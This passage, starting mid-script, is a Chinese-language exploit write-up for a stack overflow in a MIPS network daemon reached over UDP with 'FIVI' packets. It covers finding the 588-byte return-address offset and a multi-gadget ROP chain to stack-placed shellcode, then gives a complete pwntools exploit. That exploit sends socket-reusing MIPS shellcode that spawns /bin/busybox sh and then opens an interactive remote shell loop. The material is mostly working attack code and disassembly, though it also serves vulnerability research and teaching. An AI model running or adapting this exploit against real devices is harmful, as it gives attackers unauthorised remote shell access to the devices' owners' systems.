Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9'
    
    p2 += base64.b64encode(p3)
    li(p2)
    
    r.sendto(p2, (ip, port))
    

ida调试中最后发现$ra被覆盖成了`41743641`

    
    
    python2 pattern.py -s 0x41743641 -f content
    [*] Create pattern string contains 1024 characters
    ok!
    [*] Exact match at offset 588
    [+] take time: 0.0004 s
    

最后得到偏移为588，现在可以控制ra了，接下来需要寻找gadgets来getshell

程序保护都没开，所以有很多选择，这里采取的是ret2shellcode，把shellcode放到栈上，然后跳转执行即可，但是需要一个栈地址

在跳转之前需要注意一个gp寄存器，gp寄存器它的值被用来定位静态数据区域，所以要保证gp寄存器不会出错

这个值是这样算的，在ropgadget筛选的时候可以看到strcmp这里-0x7f9c，所以对应这里`strcmp + 0x7f9c =
0x0041B030`

下面这个gadgets执行完毕之后会调用close清空a0, a1, a2，为得是不影响后一个gadgets的使用，并且可以控制gp和ra

    
    
    .text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)
    .text:004020A8 8F 99 80 38                   la      $t9, close
    .text:004020AC 03 20 F8 09                   jalr    $t9 ; close
    .text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd
    .text:004020B0
    .text:004020B4
    .text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j
    .text:004020B4                                                                        # sub_401DF4+238↑j
    .text:004020B4                                                                        # sub_401DF4+284↑j
    .text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)
    .text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)
    .text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)
    .text:004020C0 03 E0 00 08                   jr      $ra
    .text:004020C4 27 BD 00 88                   addiu   $sp, 0x88
    

接着控制ra为下一个gadgets的地址

    
    
    .text:00401F98 0C 10 04 F4                   jal     my_puts
    .text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # "Can't get hello socket\n"
    .text:00401F9C
    .text:00401FA0 10 00 00 44                   b       loc_4020B4
    .text:00401FA4 00 00 00 00                   nop
    
    my_puts
    .text:004013D0 addiu   $sp, -0x10
    .text:004013D4 sw      $a1, 0x10+arg_4($sp)
    .text:004013D8 sw      $a2, 0x10+arg_8($sp)
    .text:004013DC sw      $a3, 0x10+arg_C($sp)
    .text:004013E0 addiu   $v0, $sp, 0x10+arg_4
    .text:004013E4 sw      $v0, 0x10+var_8($sp)
    .text:004013E8 addiu   $sp, 0x10
    .text:004013EC jr      $ra
    .text:004013F0 nop
    
    loc_4020B4
    .text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)
    .text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)
    .text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)
    .text:004020C0 03 E0 00 08                   jr      $ra
    .text:004020C4 27 BD 00 88                   addiu   $sp, 0x88
    

上面这个gadgets详细说一下，首先是进入my_puts这里

这里`addiu $v0, $sp, 0x10+arg_4`把栈上的地址给存到了v0中，然后又把v0的值放到了sp + 0x8这里

在4020b4中可以控制s0，这里把s0控制成`0x00413200 - 0xd`，这是因为下面的gadgets需要用到

然后又到了`loc_4020B4`这里，这里可以控制$ra，那么就可以继续ROP下去，接着到`0x00400C9C`这里的gadgets

    
    
    0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
    

恢复GP，然后控制ra到`0x00400F28`

    
    
    .text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)
    .text:00400F28
    .text:00400F2C
    .text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j
    .text:00400F2C 8F 82 80 68                   la      $v0, ifname
    .text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)
    .text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr
    .text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr
    .text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11
    .text:00400F3C
    .text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)
    .text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)
    .text:00400F48 03 E0 00 08                   jr      $ra
    .text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28
    

然后这里就需要用到上面的把s0控制成`0x00413200 - 0xd`，在`sw $v0, 0xD($s0)`这里是把v0的值放到s0 +
0xd这个位置，这个位置是`0x413200`是net_get_dns，这样的话net_get_dns这里就是v0，就是栈上的地址了，如果调用net_get_dns的时候就会调用栈上的地址

在gadgets的最后可以控制s0和ra，控制s0为net_get_dns的值也就是栈上的地址，控制ra为`0x004027C8`

    
    
    .text:004027C8 lw      $t9, 0($s0)
    .text:004027CC bne     $t9, $s1, loc_4027C0
    .text:004027D0 addiu   $s0, -4
    .text:004027D0
    .text:004027D4 lw      $ra, 0x1C+var_s8($sp)
    .text:004027D8 lw      $s1, 0x1C+var_s4($sp)
    .text:004027DC lw      $s0, 0x1C+var_s0($sp)
    .text:004027E0 jr      $ra
    .text:004027E4 addiu   $sp, 0x28
    

把栈上的地址放到t9中，会跳到loc_4027C0中执行`jalr $t9`，执行栈地址上的东西

shellcode可以采用udp_bind_shell

但是在调试的时候会发现跳不到shellcode上，所以在上面的一个地方加上一个跳转指令

![](./img/4291258782436162699.png)

至此，上面就是完整的漏洞利用

exp如下

    
    
    import socket
    from pwn import *
    import binascii
    
    context(os='linux', arch='mips', endian='big', log_level='debug')
    
    li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
    lg = lambda x : print('\033[32m' + str(x) + '\033[0m')
    
    ip = '192.168.10.108'
    port = 62720
    
    r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    lg('[+] open connection')
    
    p1 = b'FIVI'
    p1 += b'\x00\x00\x00\x00'
    p1 += b'\n'
    p1 += b'\x01\x00'
    p1 += b'\x00\x00\x00\x00\x00\x00'
    p1 += b'\xff' * 6
    p1 += b'\x00\x00'
    p1 += b'\x00'
    
    r.sendto(p1, (ip, port))
    
    recv_data, recv_addr = r.recvfrom(1024)
    
    def getmac(mac_addr):
        hex_str = binascii.hexlify(mac_addr).decode()
        mac_addr = ':'.join([hex_str[i:i+2] for i in range(0, len(hex_str), 2)])
        li('[+] mac = ' + str(mac_addr))
    
    if(len(recv_data) == 0x21d):
        mac_addr = recv_data[0x11:0x17]
        getmac(mac_addr)
    else:
        ll("[-] recv error")
    
    p2 = b'FIVI'
    p2 += b'\x00\x00\x00\x00'
    p2 += b'\n'
    p2 += b'\x02\x00'
    p2 += b'\x00\x00\x00\x00\x00\x00'
    p2 += mac_addr
    p2 += b'\x00\x00'
    p2 += b'\x8E'
    p2 = p2.ljust(0x5d, b'\x00')
    
    p3 = b'\x00' * 588
    p3 += p32(0x004020A4)
    '''
    .text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)
    .text:004020A8 8F 99 80 38                   la      $t9, close
    .text:004020AC 03 20 F8 09                   jalr    $t9 ; close
    .text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd
    .text:004020B0
    .text:004020B4
    .text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j
    .text:004020B4                                                                        # sub_401DF4+238↑j
    .text:004020B4                                                                        # sub_401DF4+284↑j
    .text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)
    .text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)
    .text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)
    .text:004020C0 03 E0 00 08                   jr      $ra
    .text:004020C4 27 BD 00 88                   addiu   $sp, 0x88
    '''
    
    p3 += b'\x00' * 0x18
    p3 += p32(0x41B030) # gp
    p3 += b'\x00' * 0x68
    p3 += p32(0x00401F98)   # ra
    '''
    .text:00401F98 0C 10 04 F4                   jal     my_puts
    .text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # "Can't get hello socket\n"
    .text:00401F9C
    .text:00401FA0 10 00 00 44                   b       loc_4020B4
    .text:00401FA4 00 00 00 00                   nop
    
    my_puts
    .text:004013D0 addiu   $sp, -0x10
    .text:004013D4 sw      $a1, 0x10+arg_4($sp)
    .text:004013D8 sw      $a2, 0x10+arg_8($sp)
    .text:004013DC sw      $a3, 0x10+arg_C($sp)
    .text:004013E0 addiu   $v0, $sp, 0x10+arg_4
    .text:004013E4 sw      $v0, 0x10+var_8($sp)
    .text:004013E8 addiu   $sp, 0x10
    .text:004013EC jr      $ra
    .text:004013F0 nop
    
    loc_4020B4
    .text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)
    .text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)
    .text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)
    .text:004020C0 03 E0 00 08                   jr      $ra
    .text:004020C4 27 BD 00 88                   addiu   $sp, 0x88
    '''
    
    p3 += b'\x00' * 0x10
    p3 += b'\x10\x00\x00\x30' # b 0xC4
    p3 += b'\x00' * 0x68
    p3 += p32(0x00413200 - 0xd) # s0
    p3 += b'\x00' * 4 # s1
    p3 += p32(0x00400C9C)     # ra
    
    # 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
    
    p3 += b'\x00' * 0x10
    p3 += p32(0x41B030) # gp
    p3 += b'\x00' * 8
    p3 += p32(0x00400F28) # ra
    '''
    .text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)
    .text:00400F28
    .text:00400F2C
    .text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j
    .text:00400F2C 8F 82 80 68                   la      $v0, ifname
    .text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)
    .text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr
    .text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr
    .text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11
    .text:00400F3C
    .text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)
    .text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)
    .text:00400F48 03 E0 00 08                   jr      $ra
    .text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28
    '''
    
    p3 += b'\x00' * 0x20
    p3 += p32(0x00413200)     # s0
    p3 += p32(0x004027C8)     # ra
    
    shellcode = b'\x00' * 0x20
    shellcode+= b"\x3C\x1C\x00\x42"        # lui   $gp, 0x42
    shellcode+= b"\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
    shellcode+= b"\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
    shellcode+= b"\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
    shellcode+= b"\x8F\x85\x80\xF4"        # lw $a1, -0x7f0c($gp)
    shellcode+= b"\x24\x0c\xff\xef"        # li      t4,-17 ( addrlen = 16 )
    shellcode+= b"\x01\x80\x30\x27"        # nor     a2,t4,zero
    shellcode+= b"\x24\x02\x10\x4a"        # li      v0,4170 ( sys_connect )
    shellcode+= b"\x01\x01\x01\x0c"        # syscall 0x40404
    
    shellcode+= b"\x3C\x1C\x00\x42"        # lui   $gp, 0x42
    shellcode+= b"\x27\x9C\xB0\x30"        # addiu $gp, $gp, -0x4fd0
    shellcode+= b"\x8F\x82\x80\xB8"        # la      $v0, server_sockfd
    shellcode+= b"\x8C\x44\x00\x00"        # lw      $a0, (server_sockfd - 0x413134)($v0)  # fd
    
    shellcode+= b"\x24\x0f\xff\xfd"        # li      t7,-3
    shellcode+= b"\x01\xe0\x28\x27"        # nor     a1,t7,zero
    #shellcode+= b"\x8f\xa4\xff\xff"        # lw      a0,-1(sp)
    shellcode+= b"\x24\x02\x0f\xdf"        # li      v0,4063 ( sys_dup2 )
    shellcode+= b"\x01\x01\x01\x0c"        # syscall 0x40404
    shellcode+= b"\x20\xa5\xff\xff"        # addi    a1,a1,-1
    shellcode+= b"\x24\x01\xff\xff"        # li      at,-1
    shellcode+= b"\x14\xa1\xff\xfb"        # bne     a1,at, dup2_loop
    
    # execve /bin/busybox sh
    shellcode+= b"\x28\x06\xFF\xFF"        # slti    $a2, $zero, -1
    shellcode+= b"\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
    shellcode+= b"\x35\xEF\x69\x6E"        # ori     $t7, $t7, 0x696e
    shellcode+= b"\xAF\xAF\xFF\xDC"        # sw      $t7, -0x24($sp)
    shellcode+= b"\x3C\x0F\x2F\x62"        # lui     $t7, 0x2f62
    shellcode+= b"\x35\xEF\x75\x73"        # ori     $t7, $t7, 0x7573
    shellcode+= b"\xAF\xAF\xFF\xE0"        # sw      $t7, -0x20($sp)
    shellcode+= b"\x3C\x0F\x79\x62"        # lui     $t7, 0x7962
    shellcode+= b"\x35\xEF\x6F\x78"        # ori     $t7, $t7, 0x6f78
    shellcode+= b"\xAF\xAF\xFF\xE4"        # sw      $t7, -0x1c($sp)
    shellcode+= b"\xAF\xA0\xFF\xE8"        # sw      $zero, -0x18($sp)
    shellcode+= b"\x3C\x0F\x73\x68"        # lui     $t7, 0x7368
    shellcode+= b"\xAF\xAF\xFF\xEC"        # sw      $t7, -0x14($sp)
    shellcode+= b"\xAF\xA0\xFF\xF0"        # sw      $zero, -0x10($sp)
    shellcode+= b"\x27\xAF\xFF\xDC"        # addiu   $t7, $sp, -0x24
    shellcode+= b"\xAF\xAF\xFF\xF4"        # sw      $t7, -0xc($sp)
    shellcode+= b"\x27\xAF\xFF\xEC"        # addiu   $t7, $sp, -0x14
    shellcode+= b"\xAF\xAF\xFF\xF8"        # sw      $t7, -8($sp)
    shellcode+= b"\xAF\xA0\xFF\xFC"        # sw      $zero, -4($sp)
    shellcode+= b"\x27\xA4\xFF\xDC"        # addiu   $a0, $sp, -0x24
    shellcode+= b"\x27\xA5\xFF\xF8"        # addiu   $a1, $sp, -8
    shellcode+= b"\x24\x02\x0F\xAB"        # addiu   $v0, $zero, 0xfab
    shellcode+= b"\x01\x01\x01\x0C"        # syscall 0x40404
    
    p3 += shellcode
    
    p2 += base64.b64encode(p3)
    li(p2)
    
    r.sendto(p2, (ip, port))
    
    while True:
        command = input("shell # ")
        if not command:
            continue
        if "exit" in command:
            r.close()
            break
        command += "\n"
        r.sendto(command.encode(), (ip, port))
        recv_data, recv_addr = r.recvfrom(4096)
        li(recv_data.decode())
    

## 总结

综合性的利用，对自己的提升非常有帮助，漏洞利用不只这一种方法，还有其他的，比如控制一参命令，调用system

## Reference

[https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247490825&idx=1&sn=9f8faeb2cd148f7b8645077385f6f861&chksm=96f40264a1838b72964115c047743625555bd8635eb50a5b5507fa5d07afe663d9b59d8c636a&mpshare=1&scene=23&srcid=01117AjQKN18fHXiXpvgTlhC&sharer_sharetime=1673411100292&sharer_shareid=b7aefdcb4bc4f30843f7570c11bdc5aa#rd](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247490825&idx=1&sn=9f8faeb2cd148f7b8645077385f6f861&chksm=96f40264a1838b72964115c047743625555bd8635eb50a5b5507fa5d07afe663d9b59d8c636a&mpshare=1&scene=23&srcid=01117AjQKN18fHXiXpvgTlhC&sharer_sharetime=1673411100292&sharer_shareid=b7aefdcb4bc4f30843f7570c11bdc5aa#rd)

<https://mp.weixin.qq.com/s/SSDcTz9ZqBDWIhI0gsp7UA>

